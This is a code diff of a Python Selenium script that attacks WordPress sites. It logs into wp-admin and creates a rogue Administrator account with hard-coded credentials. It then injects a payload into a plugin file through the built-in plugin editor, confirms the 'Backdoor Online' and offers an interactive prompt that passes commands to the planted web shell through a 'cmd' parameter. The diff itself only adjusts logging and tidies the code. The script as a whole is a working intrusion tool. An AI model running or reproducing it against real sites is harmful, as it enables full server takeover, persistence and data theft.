@@ -9,8 +9,7 @@ import urllib.parse
 import tkinter as tk
 import logging
 import sys
-import pyperclip
-from sympy import root
+from bs4 import BeautifulSoup
 
 FORMAT = '[%(asctime)s] [%(levelname)-8s] [%(message)s]'
 LOG_LEVEL = 20 #logging.INFO
@@ -26,7 +25,7 @@ def bye():
     exit()
 
 def login(user, password):
-    logging.info("Start Login")
+    logging.info(f'Login with user: {user}')
     try:
         driver.get(args.url+'/wp-login.php')
         driver.find_element_by_name('log').clear()
@@ -36,27 +35,24 @@ def login(user, password):
         driver.find_element_by_name('pwd').send_keys(password)
         time.sleep(2)
         driver.find_element_by_name('wp-submit').click()
-
-        #if 'Error' in driver.page_source:
-        if 'wp-admin' not in driver.current_url:
+        if 'Error' in driver.page_source:
             print("Invalider Login")
-            bye()
+            exit(-1)
     except:
-        print("[!] Login Fail")
+        print("Login Fail")
         exit(-1)
     logging.info('Login successful!')
   
 def crate_user():
-    logging.info('Create User')
     try:
         if 'users.php' not in driver.page_source:
             print('Current User have no Administartion rights')
-            bye()
+            exit(-1)
         driver.find_element_by_xpath("//a[@href ='users.php']").click()
-        logging.info(driver.current_url)
-        driver.find_element_by_xpath("//a[@href ='user-new.php']").click()
-        logging.info(driver.current_url)
+        driver.find_element_by_xpath("//a[@href ='user-new.php']").click() 
         time.sleep(1)
+        logging.info(f'Current Url: {driver.current_url}')
+        logging.info('Create User')
         # set user data
         driver.find_element_by_id('user_login').send_keys('sele')
         driver.find_element_by_id('email').send_keys('sele@example.de')
@@ -67,7 +63,7 @@ def crate_user():
         driver.find_element_by_id('role').send_keys('Administrator')
         driver.find_element_by_id('createusersub').click()
     except:
-        print("[!] Crate User Fail")
+        print("Crate User Fail")
         exit(-1)
     logging.info('Create User successful!')
 
@@ -84,8 +80,6 @@ def write_payload():
     driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"v")
     r.update()
     r.destroy()
-    time.sleep(1)
-    print(P_BACKUP)
 
 def cleanup():
     driver.get(EDIT_PLUGIN_URL)
@@ -99,65 +93,52 @@ def cleanup():
     driver.find_element_by_xpath("//div[@role='textbox']").send_keys(Keys.CONTROL+"v")
     r.update()
     r.destroy()
-
-    #driver.find_element_by_xpath("//div[@role='textbox']").send_keys(P_BACKUP)
     time.sleep(2)
     driver.find_element_by_xpath("//input[@value='Update File']").click()
     bye()
 
 def edit_plugin():
     global EDIT_PLUGIN_URL
-    #print(driver.get_window_size())
     driver.find_element_by_xpath("//a[@href ='tools.php']").click()
     print(driver.current_url)
     driver.find_element_by_xpath("//a[@href ='plugin-editor.php']").click()
     time.sleep(1)
-
-    try:
+    try: # Click warning window
         driver.find_element_by_class_name('file-editor-warning-dismiss').click()
     except:
         pass
     time.sleep(1)
-
-    # Check All Plugins
-    p_all = Select(driver.find_element_by_xpath("//select[@id='plugin']"))
-    print("--- All Plugins ---")
+    p_all = Select(driver.find_element_by_xpath("//select[@id='plugin']")) # Get all plugins
+    print("--- Choose Plugin ---")
     for p in p_all.options:
         print(f'[{p_all.options.index(p)}] - {p.text}')
-    num = int(input('Select Plugin: '))
+    num = int(input('Plugin Nummber: '))
     p_name = p_all.options[num].text
     driver.find_element_by_id('plugin').send_keys(p_name)
     driver.find_element_by_xpath("//input[@value='Select']").click()
-
-    # some try dont work fine
-    #driver.find_element_by_xpath("//div[@role='textbox']").clear()
-    #text = driver.find_element_by_xpath("//div[@role='textbox']").text
-
     write_payload()
-
     time.sleep(1)
     url_edit = urllib.parse.unquote(driver.current_url)
     f_name = url_edit.split('/')[-1].split('&')[0]
     p_name = url_edit.split('/')[-2].split('=')[-1]
-    print(url_edit)
-    print(f_name)
-    print(p_name)
+    logging.info(f'Current Url: {url_edit}')
+    logging.info(f'Use Plugin: {p_name}')
+    logging.info(f'Edit File: {f_name}')
     EDIT_PLUGIN_URL = driver.current_url
     driver.find_element_by_xpath("//input[@value='Update File']").click()
-
     return p_name, f_name
 
 def check_backdoor(p_name, f_name):
     driver.get(f'{args.url}/wp-content/plugins/{p_name}/{f_name}')
-    print(urllib.parse.unquote(driver.current_url))
+    logging.info(f'Current Url: {urllib.parse.unquote(driver.current_url)}')
     if '404' in driver.page_source:
         print('Cant find the Backdoor')
         bye()
-    print("Backdoor Online")    
+    logging.info("Backdoor Online")    
     
 def cmd():
-    from bs4 import BeautifulSoup
-    backdoor_path = driver.current_url
+    backdoor_url = driver.current_url
+    logging.info(f'Execute code at: {backdoor_url}')
     while True:
         cmd = input("> ")
         if cmd == 'exit':
@@ -165,7 +146,7 @@ def cmd():
         elif cmd == 'cleanup':
             cleanup()
         else:
-            driver.get(f'{backdoor_path}?cmd={cmd}')
+            driver.get(f'{backdoor_url}?cmd={cmd}')
             cleantext = BeautifulSoup(driver.page_source, "lxml").text
             print(cleantext)
 
@@ -175,10 +156,10 @@ def main():
     time.sleep(1)
     if not args.skip:    
         crate_user()
-        print(driver.current_url)
+        #print(driver.current_url)
         time.sleep(1)
         login('sele','pw123')
-        print(driver.current_url)
+        #print(driver.current_url)
         time.sleep(1)
     p_name, f_name = edit_plugin()
     time.sleep(1)
